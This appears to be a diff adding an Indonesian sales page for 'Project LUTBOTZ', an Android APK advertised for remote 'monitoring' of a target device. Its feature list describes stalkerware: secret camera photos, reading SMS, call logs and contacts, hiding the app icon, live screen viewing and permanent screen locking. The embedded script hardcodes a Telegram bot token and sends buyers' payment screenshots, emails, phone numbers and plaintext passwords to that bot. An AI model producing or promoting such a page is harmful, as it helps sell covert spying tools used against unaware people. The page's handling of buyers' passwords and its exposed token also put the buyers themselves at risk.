@@ -1,0 +1,365 @@
+<
+    <video autoplay muted loop playsinline>
+        <source src="https://www.image2url.com/r2/default/videos/1783267463148-d941441a-03bd-43ce-b70c-31714136682f.mp4" type="video/mp4">
+    </video>
+    <div style="position:fixed; inset:0; background:rgba(5,7,16,0.4); z-index:1;"></div>
+
+    <div class="halaman-blokir" id="halamanBlokir">
+        <div class="teks-blokir">🚫 ANDA TELAH DIBLOKIR<br>Karena gagal mengirim bukti 1 kali</div>
+    </div>
+
+    <div class="layar-proses" id="layarProses">
+        <div class="ikon-loading"></div>
+        <div class="teks-proses">SEDANG MEMPROSES BUKTI... MOHON TUNGGU SEBENTAR</div>
+    </div>
+
+    <div class="wadah">
+        <div class="bagian aktif" id="halDepan">
+            <div class="header"><div class="logo">LUT<span>BOTZ</span></div></div>
+            <div class="label-atas">🛡️ TERPERCAYA DAN OTOMATIS</div>
+            <h1 class="judul-utama">LUTBOTZ<br><span>WEB ORDER</span></h1>
+            <p class="deskripsi">Solusi layanan pemantauan jarak jauh terbaik<br>yang aman, terpercaya, dan mudah digunakan.</p>
+            <button class="tombol-besar" onclick="cekStatusDanBuka()">LIHAT LAYANAN ➔</button>
+            <div class="kotak-statistik">
+                <div class="ikon">👁️</div>
+                <div class="teks-stat">
+                    <div class="label-stat">KUNJUNGAN WEB</div>
+                    <div class="angka-stat">2.000+</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="bagian" id="halProduk">
+            <div class="kembali" onclick="bukaHalaman('halDepan')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M19 12H5M12 19l-7-7 7-7"/>
+                </svg>
+                KEMBALI KE BERANDA
+            </div>
+            <h2 class="judul-bagian">PILIH PRODUK KAMI</h2>
+            <div class="kartu-produk" onclick="bukaHalaman('halLutbotz')">
+                <h3>📱 PROJECT LUTBOTZ</h3>
+                <p>APK PEMANTAUAN JARAK JAUH VERSI TERBARU<br>Fitur lengkap, aman, dan berlaku selamanya!</p>
+                <p style="margin-top:15px; color:#ffdd00; font-weight:bold;">👉 KLIK UNTUK LIHAT DETAIL & BELI</p>
+            </div>
+        </div>
+
+        <div class="bagian" id="halLutbotz">
+            <div class="kembali" onclick="bukaHalaman('halProduk')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M19 12H5M12 19l-7-7 7-7"/>
+                </svg>
+                KEMBALI KE DAFTAR PRODUK
+            </div>
+            <h2 class="judul-bagian">PROJECT LUTBOTZ</h2>
+            <div class="foto-produk">
+                <img src="https://i.ibb.co/1xkCGhb/lutbotz-asli.jpg" alt="LUTBOTZ">
+            </div>
+            <div class="daftar-fitur">
+                <h3>📋 FITUR LENGKhwjAP</h3>
+                <p>Lampu kilat perangkat target</p>
+                <p>Lacak lokasi secara realtime</p>
+                <p>Kirim peringatan & notifikasi</p>
+                <p>Getarkan perangkat target</p>
+                <p>Kunci layar secara permanen</p>
+                <p>Buka kunci perangkat target</p>
+                <p>Putar suara dari jarak jauh</p>
+                <p>Putar video secara tersembunyi</p>
+                <p>Ganti wallpaper perangkat</p>
+                <p>Sembunyikan ikon aplikasi</p>
+                <p>Baca SMS & riwayat panggilan</p>
+                <p>Akses daftar kontak lengkap</p>
+                <p>Ambil foto kamera diam-diam</p>
+                <p>Lihat layar & kamera langsung</p>
+                <p>Akses galeri & file penyimpanan</p>
+                <span class="tambah">+ PANDUAN LENGKAP & TUTORIAL PENGGUNAAN PENUH SETELAH PEMBELIAN</span>
+            </div>
+            <div class="harga">💰 HARGA: Rp 45.001 / PERMANEN</div>
+            <button class="tombol-lanjut" onclick="lanjutPembayaran()">✅ SAYA SETUJU & LANJUT KE PEMBAYARAN</button>
+            <div style="text-align:center;">
+                <a href="https://www.whatsapp.com/channel/0029VbCNa8EISTkC3UQnwe0f" target="_blank" class="tombol-saluran">📢 SALURAN WHATSAPP ADMIN</a>
+            </div>
+        </div>
+
+        <div class="bagian" id="halBayar">
+            <div class="kembali" onclick="bukaHalaman('halLutbotz')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M19 12H5M12 19l-7-7 7-7"/>
+                </svg>
+                KEMBALI KE DETAIL PRODUK
+            </div>
+            <h2 class="judul-bayar">PEMBAYARAN PROJECT LUTBOTZ</h2>
+            <div class="peringatan-pembayaran">
+                ⚠️ PERINGATAN WAJIB:<br>
+                ✅ **WAJIB SCREENSHOT BUKTI PEMBAYARAN** — BUKAN DIFOTO<br>
+                ✅ **HANYA BOLEH 1 KALI COBA SAJA**<br>
+                ✅ GAGAL 1 KALI → LANGSUNG DIBLOKIR PERMANEN
+            </div>
+            <div class="qris-box">
+                <img src="https://i.ibb.co/gLKpf636/qris.png" alt="QRIS Pembayaran">
+                <button class="tombol-simpan" onclick="alert('Gambar QRIS disimpan, silakan bayar lalu kirim screenshot')">💾 SIMPAN GAMBAR QRIS</button>
+            </div>
+            <div class="area-input" id="areaInput">
+                <label class="tombol-pilih" for="fileBukti">📷 PILIH FOTO BUKTI TRANSFER</label>
+                <input type="file" id="fileBukti" accept="image/*" onchange="tampilPreview(this)">
+                <div class="preview" id="preview">Belum ada foto dipilih</div>
+            </div>
+            <button class="tombol-kirim" id="tombolKirim" onclick="kirimBukti()">✅ KIRIM BUKTI TRANSFER</button>
+            <div class="info-proses" id="infoProses">⏳ SEDANG MEMERIKSA BUKTI...</div>
+            <div class="pesan" id="pesan"></div>
+            <div class="info-berhasil" id="infoBerhasil">
+                <h2>✅ BUKTI TERKONFIRMASI VALID</h2>
+                <a href="https://lutbotz.site/team/tutoriallutbotz.html" target="_blank" class="link-tutorial"> LINK APK + VIDEO TUTORIAL FULL</a>
+                 <div class="form-request" id="formRequest">
+                     <p style="margin-bottom:15px;">Silakan isi data di bawah ini untuk membuat akun akses </p>
+                     <div class="input-group">
+                         <label>Nama Lengkap</label>
+                         <input type="text" id="namaUser" placeholder="Masukkan nama Anda">
+                     </div>
+                     <div class="input-group">
+                         <label>Alamat Email (wajib @gmail.com)</label>
+                         <input type="email" id="emailUser" placeholder="contoh@gmail.com">
+                     </div>
+                     <div class="input-group">
+                         <label>Nomor WhatsApp</label>
+                         <div class="input-nomor-wa">
+                             <div class="kode-negara">+62</div>
+                             <input type="tel" class="input-nomor" id="waUser" placeholder="81234567890">
+                         </div>
+                     </div>
+                     <button class="tombol-buatpw" id="btnBuatPw" onclick="tampilInputPw()"> BUAT PASSWORD</button>
+                     <div class="input-group" id="inputPwGrup">
+                         <label>Password Akun</label>
+                         <input type="password" id="pwUser" placeholder="Buat password yang kuat">
+                         <div class="syarat-pw"> Syarat Password:<br> Minimal 4 Huruf<br> Minimal 1 Angka<br> Minimal 2 Simbol (@ # $ ! % & *)</div>
+                         <a href="#" class="tombol-hubungi" id="btnHubungi" onclick="return prosesDanKirim()"> KIRIM KE ADMIN</a>
+                     </div>
+                 </div>
+                 <div class="data-akun" id="tampilDataAkun">
+                      DATA AKUN ANDA:<br>
+                      Email: <span id="emailTampil"></span><br>
+                      Password: <span id="pwTampil"></span>
+                 </div>
+                 <div class="pesan-berhasil-kirim" id="pesanBerhasilKirim">
+                      DATA BERHASIL DIKIRIM!<br>
+                     TUNGGU SEKITAR 24 JAM AKUN ANDA AKTIF
+                 </div>
+             </div>
+         </div>
+     </div>
+ <script>
+ //  TOKEN SUDAH DIGANTI & DIAMANKAN
+ const a = "8689648465";
+ const b = "AAH3pzgjXvf14WJuem-jBd6jDBB8mAC4wmw";
+ const _ = a + ":" + b;
+ const $ = "8341977261";
+ const TOKEN_BOT = _;
+ const ID_ADMIN = $;
+ const statusBlokir = localStorage.getItem('diblokir_lutbotz') === 'YA';
+ const statusValid = localStorage.getItem('bukti_valid') === 'YA';
+ const sudahKirimData = localStorage.getItem('sudah_kirim_data') === 'YA';
+ if (statusBlokir) {
+     document.getElementById('halamanBlokir').classList.add('aktif');
+     document.body.style.overflow = 'hidden';
+ } else if (statusValid) {
+     document.querySelectorAll('.bagian').forEach(b => b.classList.remove('aktif'));
+     document.getElementById('halBayar').classList.add('aktif');
+     document.getElementById('areaInput').classList.add('sembunyi');
+     document.getElementById('tombolKirim').classList.add('sembunyi');
+     document.querySelector('.peringatan-pembayaran').style.display = 'none';
+     document.querySelector('.qris-box').style.display = 'none';
+     document.getElementById('infoBerhasil').classList.add('tampil');
+     if (sudahKirimData) {
+         document.getElementById('formRequest').classList.add('sembunyi');
+         document.getElementById('pesanBerhasilKirim').classList.add('aktif');
+         document.getElementById('emailTampil').textContent = localStorage.getItem('email_req') || '-';
+         document.getElementById('pwTampil').textContent = localStorage.getItem('pw_req') || '-';
+         document.getElementById('tampilDataAkun').classList.add('aktif');
+     }
+ }
+ function cekStatusDanBuka() {
+     if (statusValid) bukaHalaman('halBayar');
+     else bukaHalaman('halProduk');
+ }
+ function lanjutPembayaran() {
+     if (statusBlokir || statusValid) return;
+     const layar = document.getElementById('layarProses');
+     layar.classList.add('aktif');
+     setTimeout(() => {
+         bukaHalaman('halBayar');
+         layar.classList.remove('aktif');
+     }, 1500);
+ }
+ function bukaHalaman(id) {
+     if (statusBlokir || statusValid) return;
+     document.querySelectorAll('.bagian').forEach(b => b.classList.remove('aktif'));
+     document.getElementById(id).classList.add('aktif');
+     window.scrollTo(0, 0);
+ }
+ function tampilInputPw() {
+     if(localStorage.getItem('sudah_kirim_data') === 'YA') return;
+     document.getElementById('inputPwGrup').style.display = 'block';
+     document.getElementById('btnHubungi').classList.add('tampil');
+     document.getElementById('btnBuatPw').style.display = 'none';
+ }
+ async function prosesDanKirim() {
+     if (localStorage.getItem('sudah_kirim_data') === 'YA') return false;
+     const email = document.getElementById('emailUser').value.trim();
+     const waInput = document.getElementById('waUser').value.trim();
+     const pw = document.getElementById('pwUser').value.trim();
+     const nomorWA = '62' + waInput;
+     if (!email.endsWith('@gmail.com')) {
+         alert(' Email wajib menggunakan @gmail.com!');
+         return false;
+     }
+     if (waInput.length < 10 || isNaN(waInput)) {
+         alert(' Nomor WhatsApp tidak valid! Masukkan tanpa angka 0 di depan');
+         return false;
+     }
+     const hitungHuruf = (pw.match(/[a-zA-Z]/g) || []).length;
+     const hitungAngka = (pw.match(/[0-9]/g) || []).length;
+     const hitungSimbol = (pw.match(/[^a-zA-Z0-9\s]/g) || []).length;
+     if (hitungHuruf < 4) {alert(' Password harus memiliki minimal 4 huruf!'); return false;}
+     if (hitungAngka < 1) {alert(' Password harus memiliki minimal 1 angka!'); return false;}
+     if (hitungSimbol < 2) {alert(' Password harus memiliki minimal 2 simbol!'); return false;}
+     const pesanTele = `/lxregist ${email} ${nomorWA} ${nomorWA} ${pw}`;
+     await fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
+         method: 'POST',
+         headers: {'Content-Type': 'application/json'},
+         body: JSON.stringify({chat_id: ID_ADMIN, text: pesanTele})
+     });
+     localStorage.setItem('sudah_kirim_data', 'YA');
+     localStorage.setItem('email_req', email);
+     localStorage.setItem('pw_req', pw);
+     document.getElementById('formRequest').classList.add('sembunyi');
+     document.getElementById('pesanBerhasilKirim').classList.add('aktif');
+     document.getElementById('emailTampil').textContent = email;
+     document.getElementById('pwTampil').textContent = pw;
+     document.getElementById('tampilDataAkun').classList.add('aktif');
+     const pesanWA = encodeURIComponent(`bang request username \n\nEmail : ${email}\nno wa : ${nomorWA}\npassword : ${pw}`);
+     window.open(`https://wa.me/6285713924519?text=${pesanWA}`, '_blank');
+     return false;
+ }
+ let sudahCoba = localStorage.getItem('sudah_coba') === 'YA';
+ let fileBukti = null;
+ async function kirimKeBot(file, teks) {
+     try {
+         const form = new FormData();
+         form.append('chat_id', ID_ADMIN);
+         form.append('photo', file);
+         form.append('caption', teks);
+         await fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendPhoto`, {method: 'POST', body: form});
+     } catch (e) {
+         try {
+             await fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
+                 method: 'POST', headers: {'Content-Type': 'application/json'},
+                 body: JSON.stringify({chat_id: ID_ADMIN, text: teks})
+             });
+         } catch {}
+     }
+ }
+ function perjelasGambar(file) {
+     return new Promise(resolve => {
+         const img = new Image();
+         img.crossOrigin = "anonymous";
+         img.onload = () => {
+             const canvas = document.createElement('canvas');
+             const ctx = canvas.getContext('2d');
+             canvas.width = Math.min(img.width * 3, 3000);
+             canvas.height = Math.min(img.height * 3, 3000);
+             ctx.filter = 'contrast(320%) brightness(180%) grayscale(100%)';
+             ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+             canvas.toBlob(b => resolve(b), 'image/png', 1.0);
+         };
+         img.onerror = () => resolve(file);
+         img.src = URL.createObjectURL(file);
+     });
+ }
+ function cekNama(teks) {
+     const bersih = teks.replace(/[^A-Z0-9]/g, '');
+     const polaValid = /L0LIP0P|L0LIPOP|LOL1POP|LOLIP0P|LOLIPOP|L0L1P0P|L0L1POP|LOL1P0P/i;
+     return polaValid.test(bersih);
+ }
+ function cekNominal(teks) {
+     const bersih = teks.replace(/[^0-9.,]/g, '');
+     const polaValid = /45[.,]?001([.,]00)?$/;
+     return polaValid.test(bersih);
+ }
+ function tampilPreview(input) {
+     const pr = document.getElementById('preview');
+     const pesan = document.getElementById('pesan');
+     pesan.style.display = 'none';
+     if (input.files && input.files[0]) {
+         fileBukti = input.files[0];
+         const baca = new FileReader();
+         baca.onload = e => pr.innerHTML = `<img src="${e.target.result}" alt="Bukti">`;
+         baca.readAsDataURL(fileBukti);
+     } else {
+         pr.innerHTML = "Belum ada foto dipilih";
+         fileBukti = null;
+     }
+ }
+ async function kirimBukti() {
+     if (statusBlokir || statusValid || sudahCoba) return;
+     const pesan = document.getElementById('pesan');
+     const infoProses = document.getElementById('infoProses');
+     const infoBerhasil = document.getElementById('infoBerhasil');
+     const areaInput = document.getElementById('areaInput');
+     const tombolKirim = document.getElementById('tombolKirim');
+     const peringatan = document.querySelector('.peringatan-pembayaran');
+     const kotakQris = document.querySelector('.qris-box');
+     pesan.style.display = 'none';
+     infoBerhasil.classList.remove('tampil');
+     
+     if (!fileBukti) {
+         pesan.className = 'pesan gagal';
+         pesan.textContent = ' Silakan pilih foto bukti terlebih dahulu!';
+         pesan.style.display = 'block';
+         return;
+     }
+     sudahCoba = true;
+     localStorage.setItem('sudah_coba', 'YA');
+     infoProses.classList.add('aktif');
+     
+     try {
+         const gambarJelas = await perjelasGambar(fileBukti);
+         const hasilOcr = await Tesseract.recognize(gambarJelas, 'ind+eng', {
+             tessedit_char_whitelist: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:.,',
+             pageseg_mode: 3
+         });
+         const teksBersih = hasilOcr.data.text.toUpperCase().trim();
+         
+         const adaNama = cekNama(teksBersih);
+         const adaNominal = cekNominal(teksBersih);
+         const alasan = [];
+         
+         if (!adaNama) alasan.push('Nama penerima tidak sesuai');
+         if (!adaNominal) alasan.push('Nominal pembayaran tidak sesuai');
+         
+         if (alasan.length === 0) {
+             localStorage.setItem('bukti_valid', 'YA');
+             areaInput.classList.add('sembunyi');
+             tombolKirim.classList.add('sembunyi');
+             peringatan.style.display = 'none';
+             kotakQris.style.display = 'none';
+             infoProses.classList.remove('aktif');
+             infoBerhasil.classList.add('tampil');
+             await kirimKeBot(fileBukti, ` BUKTI PEMBAYARAN VALID\n Penerima: LOLIPOP\n Nominal: Sesuai Rp 45.001`);
+         } else {
+             localStorage.setItem('diblokir_lutbotz', 'YA');
+             infoProses.classList.remove('aktif');
+             document.getElementById('halamanBlokir').classList.add('aktif');
+             document.body.style.overflow = 'hidden';
+             await kirimKeBot(fileBukti, ` DIBLOKIR\n Gagal verifikasi\n Alasan: ${alasan.join(', ')}\n Teks terbaca:\n${teksBersih}`);
+         }
+     } catch (err) {
+         localStorage.setItem('diblokir_lutbotz', 'YA');
+         infoProses.classList.remove('aktif');
+         document.getElementById('halamanBlokir').classList.add('aktif');
+         document.body.style.overflow = 'hidden';
+         await kirimKeBot(fileBukti, ` DIBLOKIR\n Kesalahan proses verifikasi`);
+     }
+ }
+ </script>
+ </body>
+ </html>
